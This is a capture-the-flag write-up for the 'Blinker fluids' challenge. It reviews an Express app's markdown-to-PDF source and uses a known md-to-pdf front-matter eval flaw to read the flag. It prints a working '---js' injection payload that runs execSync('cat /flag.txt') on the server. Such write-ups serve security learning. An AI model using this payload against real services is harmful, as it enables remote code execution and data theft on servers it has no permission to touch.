# Blinker fluids

We are given a docker instance along with the source code of the web application.

The website just takes a markdown that a user inputs and converts it to a PDF.

![1.png](Blinker%20fluids%201e42bb7905f043beba6a7cb028733b47/1.png)

![2.png](Blinker%20fluids%201e42bb7905f043beba6a7cb028733b47/2.png)

COOL. Now let us take a look at source code.

```jsx
const express      = require('express');
const app          = express();
const path         = require('path');
const nunjucks     = require('nunjucks');
const routes       = require('./routes/index.js');
const Database     = require('./database');

const db = new Database('invoice.db');

app.use(express.json());
app.disable('etag');

nunjucks.configure('views', {
        autoescape: true,
        express: app
});

app.set('views', './views');
app.use('/static', express.static(path.resolve('static')));

app.use(routes(db));

app.all('*', (req, res) => {
        return res.status(404).send({
                message: '404 page not found'
        });
});

(async () => {
        await db.connect();
        await db.migrate();
        app.listen(1337, '0.0.0.0', () => console.log('Listening on port 1337'));
})();
```

Nothing interesting here. We can see routes, views and database initialization.

```jsx
const express        = require('express');
const router         = express.Router();
const MDHelper       = require('../helpers/MDHelper.js');

let db;

const response = data => ({ message: data });

router.get('/', async (req, res) => {
    return res.render('index.html');
});

router.get('/api/invoice/list', async (req, res) => {
        return db.listInvoices()
                .then(invoices => {
                        res.json(invoices);
                })
                .catch(e => {
                        res.status(500).send(response('Something went wrong!'));
                })
});

router.post('/api/invoice/add', async (req, res) => {
    const { markdown_content } = req.body;

    if (markdown_content) {
        return MDHelper.makePDF(markdown_content)
            .then(id => {
                db.addInvoice(id)
                                        .then(() => {
                                                res.send(response('Invoice saved successfully!'));
                                        })
                                        .catch(e => {
                                                res.send(response('Something went wrong!'));
                                        })
            })
            .catch(e => {
                console.log(e);
                return res.status(500).send(response('Something went wrong!'));
            })
    }
    return res.status(401).send(response('Missing required parameters!'));
});

router.post('/api/invoice/delete', async (req, res) => {
        const { invoice_id } = req.body;

        if (invoice_id) {
                return db.deleteInvoice(invoice_id)
                .then(() => {
                        res.send(response('Invoice removed successfully!'))
                })
                .catch(e => {
                        res.status(500).send(response('Something went wrong!'));
                })
        }

        return res.status(401).send(response('Missing required parameters!'));
});

module.exports = database => {
    db = database;
    return router;
};
```

From the routes, we can see 3 routes here - 

- `GET` request to `/api/invoice/list` → Just returns all the generated invoices in JSON format.
- `POST` request to `/api/invoice/add` → Expects a POST parameter `markdown_content`, then it generates the PDF out of the markdown using the `MDHelper.makePDF()`.
- `POST` request to `/api/invoice/delete` → Deletes an invoice based on an ID specified by the POST parameter `invoice_id`.

```jsx
const { mdToPdf }    = require('md-to-pdf')
const { v4: uuidv4 } = require('uuid')

const makePDF = async (markdown) => {
    return new Promise(async (resolve, reject) => {
        id = uuidv4();
        try {
            await mdToPdf(
                { content: markdown },
                {
                    dest: `static/invoices/${id}.pdf`,
                    launch_options: { args: ['--no-sandbox', '--js-flags=--noexpose_wasm,--jitless'] } 
                }
            );
            resolve(id);
        } catch (e) {
            reject(e);
        }
    });
}

module.exports = {
    makePDF
};
```

 

This is the function that converts the markdown to PDF. 

We can see that the application is using `md-to-pdf` for the conversion.

Now, if I search though google, I can see that `md-to-pdf` is vulnerable to RCE. 

`md-to-pdf` uses a library called `grey-matter` for parsing the front matter. Now the issue arises because the `grey-matter` exposes a `JS engine` by default and this engine runs `eval` on the given markdown. Now I do not need to explain how nice `eval` is 🙂.

You can refer https://github.com/simonhaenisch/md-to-pdf/issues/99 for further reading.

Let us straightly get the flag then.

```yaml
---js
{
    css: `body::before { content: "${(require("child_process")).execSync("cat /flag.txt")}"; display: block }`,
}
---
```

![3.png](Blinker%20fluids%201e42bb7905f043beba6a7cb028733b47/3.png)

You can see this nice PDF.

That is all in this challenge. Hope you liked it. 🙂